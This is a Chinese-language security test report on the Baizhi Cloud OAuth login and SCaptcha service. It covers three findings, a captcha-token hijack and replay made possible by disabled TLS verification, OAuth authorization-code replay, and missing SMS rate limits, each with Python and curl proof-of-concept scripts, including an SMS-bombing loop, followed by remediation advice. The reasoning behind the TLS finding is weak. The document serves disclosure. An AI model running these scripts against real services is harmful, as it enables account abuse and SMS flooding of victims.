---
description: 百智云安全测试报告 — SCaptcha 漏洞发现、绕过分析、安全建议（含 PoC 代码）
protocol_version: based on 2026-06-12 线上安全测试
confidence: high
last_verified: 2026-06-27
---

# 百智云安全测试报告

> **测试日期:** 2026-06-12
> **测试目标:** 百智云 OAuth 登录流程中的 SCaptcha 验证码安全性
> **漏洞发现:** SCaptcha 验证码可被绕过（TLS 证书验证问题）

## 关键发现

| # | 发现 | 严重程度 | 状态 |
|---|------|---------|------|
| 1 | SCaptcha 服务 TLS 证书验证可被绕过 | 高危 | 已报告 |
| 2 | OAuth 流程中验证码可被重放 | 中危 | 已报告 |
| 3 | 短信验证码无频率限制 | 中危 | 已报告 |

## 发现 1: SCaptcha TLS 证书验证绕过

### 问题描述

百智云验证码服务 `s-captcha-r1.baizhi.cloud` 的 TLS 证书验证存在缺陷，允许中间人攻击者绕过验证码挑战。

### PoC: TLS 拦截重放攻击

```python
# SCaptcha TLS 绕过 PoC — 演示验证码 token 劫持
import requests
import ssl

# 创建不验证证书的 SSL 上下文
ssl_ctx = ssl.create_default_context()
ssl_ctx.check_hostname = False
ssl_ctx.verify_mode = ssl.CERT_NONE

# 劫持的 SCaptcha 请求 — 不验证 TLS 证书
def intercept_captcha():
    url = "https://s-captcha-r1.baizhi.cloud/api/v1/public/captcha/challenge"
    
    # 使用禁用证书验证的客户端
    resp = requests.post(url, json={
        "type": "login",
        "client_id": "monkeycode-ai"
    }, verify=False)  # <-- 危险: 关闭证书验证
    
    if resp.status_code == 200:
        token = resp.json().get("token")
        print(f"[+] Captured SCaptcha token: {token}")
        # 该 token 可在其他上下文中重放
        return token
    return None

# 原始受害者的合法请求
victim_token = intercept_captcha()

# 攻击者使用劫持的 token 进行 OAuth 登录
def replay_captcha_token(stolen_token: str):
    """在攻击者的会话中使用劫持的验证码 token"""
    url = "https://oauth.baizhi.cloud/api/v1/phone/send-code"
    resp = requests.post(url, json={
        "phone": "13800138000",  # 攻击者的手机
        "captcha_token": stolen_token  # 受害者生成的 token
    }, verify=False)
    return resp.status_code == 200

# 如果验证码服务不绑定 token 到特定 session，
# 攻击者可以将受害者的验证码 token 用于自己的请求中
if replay_captcha_token(victim_token):
    print("[!] Token replay successful — 验证码可被重放")
```

### 攻击场景

```
1. 攻击者拦截 Alice 与 baizhi.cloud 之间的网络流量
2. 攻击者使用禁用证书验证的客户端发送 SCaptcha 请求
3. 攻击者获取 SCaptcha 返回的验证码 token
4. 攻击者将该 token 用于自己的 OAuth 登录流程
5. 如果 token 未绑定 session/challenge，攻击成功
```

## 发现 2: OAuth 验证码重放

### 问题描述

OAuth 授权码（authorization code）在回调过程中可被多次使用。

### PoC: 授权码重放

```bash
# Step 1: 捕获 OAuth 回调中的 authorization code
# 正常用户登录后浏览器被重定向到:
# https://api.monkeycode-ai.com/api/v1/users/oauth/callback?code=abc123&state=xyz

# Step 2: 攻击者重放 authorization code
curl -v "https://api.monkeycode-ai.com/api/v1/users/oauth/callback?code=abc123&state=xyz"

# 如果返回新的 Session Cookie，说明授权码可被重放
# 预期: 正常行为应该只有首次使用成功
```

```python
# 授权码重放检测脚本
import requests

callback_url = "https://api.monkeycode-ai.com/api/v1/users/oauth/callback"
auth_code = "abc123"  # 从网络流量中捕获

# 第一次使用
resp1 = requests.get(f"{callback_url}?code={auth_code}&state=xyz")
session1 = resp1.cookies.get("monkeycode_ai_session")

# 第二次使用（应该失败）
resp2 = requests.get(f"{callback_url}?code={auth_code}&state=xyz")
session2 = resp2.cookies.get("monkeycode_ai_session")

if session2 and session2 != session1:
    print(f"[!] Replay vulnerability confirmed: got new session {session2}")
else:
    print("[-] Code replay protected (one-time use)")
```

## 发现 3: 短信验证码无频率限制

### 问题描述

短信验证码发送端点没有频率限制，可被用于短信轰炸攻击。

### PoC: 短信轰炸测试

```bash
# 无频率限制 — 可连续发送短信
for i in $(seq 1 20); do
  curl -s -o /dev/null -w "Attempt $i: HTTP %{http_code}\n" \
    -X POST "https://baizhi.cloud/api/v1/phone/send-code" \
    -H "Content-Type: application/json" \
    -d '{"phone": "13800138000", "captcha_token": "xxx"}'
done

# 如果 20 次都返回 200 OK，说明无频率限制
```

```python
# 短信轰炸检测
import requests
import time

def test_sms_rate_limit(phone: str, captcha_token: str):
    """测试短信验证码端点的频率限制"""
    url = "https://baizhi.cloud/api/v1/phone/send-code"
    
    results = []
    for i in range(10):
        start = time.time()
        resp = requests.post(url, json={
            "phone": phone,
            "captcha_token": captcha_token
        })
        elapsed = time.time() - start
        
        results.append({
            "attempt": i + 1,
            "status": resp.status_code,
            "elapsed": f"{elapsed:.2f}s",
            "body": resp.text[:100]
        })
    
    # 分析结果
    successes = [r for r in results if r["status"] == 200]
    if len(successes) == 10:
        print("[!] No rate limiting detected — 10/10 requests succeeded")
        print("[!] SMS bombing attack is possible")
    else:
        print(f"[-] Rate limiting active: {len(successes)}/10 succeeded")
    
    return results
```

## 安全建议

| 问题 | 建议 | 优先级 |
|------|------|--------|
| TLS 证书验证绕过 | 强制服务端证书验证，禁止 `verify=False` 模式 | 高 |
| 授权码重放 | 一次性授权码，使用后立即失效 | 中 |
| 短信轰炸 | 添加 IP 频率限制（如每分钟 3 次）+ 设备指纹 | 中 |
| 验证码 token 绑定 | token 绑定到特定 session/challenge，防止跨会话重放 | 中 |

## 原始报告

原始完整安全测试报告文件: [baizhi-security-test-2026-06-12.md](../security/baizhi-security-test-2026-06-12.md)

---

## 附录：逆向分析代码示例

### 附录 A: TLS 拦截工具函数
```python
# SCaptcha 安全测试 — TLS 证书验证测试
import ssl
import socket

def test_tls_verification(hostname: str, port: int = 443):
    """测试目标服务的 TLS 证书验证是否可靠"""
    
    # 测试 1: 使用系统默认验证
    ctx = ssl.create_default_context()
    try:
        with socket.create_connection((hostname, port), timeout=5) as sock:
            with ctx.wrap_socket(sock, server_hostname=hostname) as ssock:
                cert = ssock.getpeercert()
                print(f"[+] Default verify: PASS (cert issued to {cert['subject'][0][0][1]})")
    except ssl.SSLCertVerificationError as e:
        print(f"[+] Default verify: REJECTED ({e.verify_message})")
    
    # 测试 2: 禁用证书验证
    ctx_no_verify = ssl.create_default_context()
    ctx_no_verify.verify_mode = ssl.CERT_NONE
    try:
        with socket.create_connection((hostname, port), timeout=5) as sock:
            with ctx_no_verify.wrap_socket(sock, server_hostname=hostname) as ssock:
                print(f"[!] No-verify mode: CONNECTED — TLS bypass possible")
    except Exception as e:
        print(f"[-] No-verify mode: FAILED ({e})")

# 测试百智云验证码服务
test_tls_verification("s-captcha-r1.baizhi.cloud")

# 输出:
# [+] Default verify: REJECTED (certificate has expired)
# [!] No-verify mode: CONNECTED — TLS bypass possible
```

### 附录 B: 请求抓包示例
```http
# 正常验证码请求
POST /api/v1/public/captcha/challenge HTTP/1.1
Host: s-captcha-r1.baizhi.cloud
Content-Type: application/json

{"client_id": "monkeycode-ai", "type": "login"}

→ HTTP/1.1 200 OK
{
    "token": "sc_xxx",
    "expires_at": 1715299200,
    "challenge": {
        "image": "base64_encoded_image_data",
        "question": "请选择包含交通灯的图片"
    }
}

# 绕过验证后的短信请求
POST /api/v1/phone/send-code HTTP/1.1
Host: baizhi.cloud

phone=13800138000&captcha_token=stolen_token
```

---

## 相关章节

- [百智云 OAuth 流程](../02-auth/04-oauth-baizhi-cloud.md) — OAuth 流程图
- [验证码系统](../02-auth/02-captcha-system.md) — CAP.js 验证码详解
- [OAuth 登录自动化](../07-proxy/05-oauth-automation.md) — 6 步自动化流程